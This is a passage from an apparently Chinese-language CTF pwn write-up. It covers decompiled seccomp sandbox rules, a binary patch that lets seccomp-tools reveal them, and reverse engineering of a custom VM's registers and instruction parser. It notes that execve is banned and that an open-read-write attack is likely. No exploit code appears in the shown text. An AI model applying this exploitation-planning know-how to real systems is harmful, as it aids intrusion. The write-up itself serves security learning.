  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v62<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">317</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v19<span class="token punctuation">,</span> v20<span class="token punctuation">,</span> v45<span class="token punctuation">,</span> v62<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v63<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v21<span class="token punctuation">,</span> v22<span class="token punctuation">,</span> v46<span class="token punctuation">,</span> v63<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v64<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">257</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v23<span class="token punctuation">,</span> v24<span class="token punctuation">,</span> v47<span class="token punctuation">,</span> v64<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v65<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v26<span class="token punctuation">,</span> v48<span class="token punctuation">,</span> v65<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v66<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v27<span class="token punctuation">,</span> v28<span class="token punctuation">,</span> v49<span class="token punctuation">,</span> v66<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v67<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v29<span class="token punctuation">,</span> v30<span class="token punctuation">,</span> v50<span class="token punctuation">,</span> v67<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v68<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> v31<span class="token punctuation">,</span> v32<span class="token punctuation">,</span> v51<span class="token punctuation">,</span> v68<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_rule_add_exact</span><span class="token punctuation">(</span>v69<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> v33<span class="token punctuation">,</span> v34<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">seccomp_load</span><span class="token punctuation">(</span>v69<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里read相关的这个函数处理的逻辑很奇怪，只有read的返回值为0才会往下走，搜索了一下 read只有读到一个eof才会返回0，因为这里read的逻辑，seccomp_tools 识别不出来沙箱的规则，所以需要使用ida去patch一下程序，在main函数的入口那 patch这样的逻辑</p>
<pre class="line-numbers language-none"><code class="language-none">mov r15,seccomp_init_function_addr
call r15

seccomp_init_function:
jmp main_end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让程序一运行就把seccomp_init走一遍就能把沙箱的逻辑识别出来了，execve execveat被禁用了，有对x32 abi之类的使用做限制，大概率要打orw了</p>
<img src="/2024/05/14/miniL2024-pwn/1714477266152.png" class="" width="1714477266152">

<p>通过分析start_vm的逻辑和动调 尝试对start_vm做一些修复，重命名:<br>可以得知有 六个通用寄存器 名字分别是 REG0 - REG5 有一个PC寄存器 和一个flag寄存器<br>大概是这样一个结构体</p>
<pre class="line-numbers language-none"><code class="language-none">00000000 Virtual_machine struc ; (sizeof&#x3D;0x60, mappedto_18)
00000000 register0       dq ?
00000008 register1       dq ?
00000010 register2       dq ?
00000018 register3       dq ?
00000020 register4       dq ?
00000028 register5       dq ?
00000030 unknow1         dq ?
00000038 flags_register  dq ?
00000040 Instruction_type dq ?
00000048 pc_register     dq ?
00000050 error_code      dq ?
00000058 input_data_addr dq ?
00000060 Virtual_machine ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>重命名后的伪代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">start_vm</span><span class="token punctuation">(</span>Virtual_machine <span class="token operator">*</span>virtual_machine<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 pc_register<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// rbx</span>
  __int64 input_data_addr<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">;</span> <span class="token comment">// cl</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v8<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// cl</span>
  <span class="token keyword">unsigned</span> __int64 v11<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v14<span class="token punctuation">;</span> <span class="token comment">// cl</span>
  <span class="token keyword">unsigned</span> __int64 v15<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> v17<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v19<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v20<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
  <span class="token keyword">int</span> v22<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v23<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v24<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v32<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v34<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v35<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v36<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v37<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v38<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v39<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v40<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v41<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v42<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v43<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v44<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v45<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v46<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v47<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> v48<span class="token punctuation">;</span> <span class="token comment">// edx</span>
  <span class="token keyword">int</span> v49<span class="token punctuation">;</span> <span class="token comment">// ecx</span>
  <span class="token keyword">int</span> v50<span class="token punctuation">;</span> <span class="token comment">// r8d</span>
  <span class="token keyword">int</span> v51<span class="token punctuation">;</span> <span class="token comment">// r9d</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-BCh]</span>
  __int64 v53<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-B8h]</span>
  <span class="token keyword">unsigned</span> __int64 v54<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-B0h]</span>
  <span class="token keyword">unsigned</span> __int64 v55<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-A8h]</span>
  <span class="token keyword">unsigned</span> __int64 v56<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-A0h]</span>
  <span class="token keyword">unsigned</span> __int64 Instruction_only_one_operand__first_operand_len<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-98h]</span>
  <span class="token keyword">unsigned</span> __int64 Instruction_only_two_operand__first_operand_len<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-90h]</span>
  <span class="token keyword">unsigned</span> __int64 Instruction_only_two_operand__second_operand_len<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-88h]</span>
  <span class="token keyword">unsigned</span> __int64 v60<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v61<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v62<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v63<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v64<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v65<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v66<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v67<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v68<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v69<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v70<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v71<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v72<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v73<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-80h]</span>
  <span class="token keyword">unsigned</span> __int64 v74<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v75<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v76<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v77<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v78<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v79<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v80<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v81<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v82<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  <span class="token keyword">unsigned</span> __int64 v83<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-78h]</span>
  __int64 <span class="token operator">*</span>v84<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-70h]</span>
  __int64 v85<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-60h] BYREF</span>
  __int64 v86<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-40h] BYREF</span>

  v86<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v53 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v85<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v86<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
LABEL_193<span class="token operator">:</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">&lt;=</span> <span class="token number">0xFFFuLL</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">' '</span>
          <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\t'</span>
          <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\n'</span>
          <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\r'</span><span class="token punctuation">)</span>
         <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
      <span class="token operator">++</span>virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>           <span class="token comment">// pc寄存器跳过指令序列中的' ' '\n' '\r' '\t'</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      pc_register <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>pc_register <span class="token operator">+</span> <span class="token function">j_wcsncmp_ifunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        v2 <span class="token operator">=</span> <span class="token function">j_wcsncmp_ifunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">j_strncmp_ifunc</span><span class="token punctuation">(</span>
                              virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>input_data_addr<span class="token punctuation">,</span>
                              <span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">,</span>
                              v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          virtual_machine<span class="token operator">-></span>Instruction_type <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          v3 <span class="token operator">=</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
          virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">=</span> v3 <span class="token operator">+</span> <span class="token function">j_wcsncmp_ifunc</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        virtual_machine<span class="token operator">-></span>Instruction_type <span class="token operator">=</span> <span class="token number">20LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>instruction_list<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span> <span class="token operator">*</span> virtual_machine<span class="token operator">-></span>Instruction_type <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">j_memset_ifunc</span><span class="token punctuation">(</span>v85<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">32LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">' '</span>
            <span class="token operator">||</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'\t'</span><span class="token punctuation">)</span>
           <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span>
           <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>
        <span class="token operator">++</span>virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span> Instruction_only_one_operand__first_operand_len <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">' '</span>
         <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\t'</span>
         <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>pc_register <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFF</span>
         <span class="token operator">&amp;&amp;</span> Instruction_only_one_operand__first_operand_len <span class="token operator">&lt;=</span> <span class="token number">0x1E</span><span class="token comment">// 单个操作数的指令序列第一个操作数长度不超过 0x1E</span>
         <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>virtual_machine<span class="token operator">-></span>input_data_addr <span class="token operator">+</span> virtual_machine<span class="token operator">-></span>pc_register<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\r'</span>
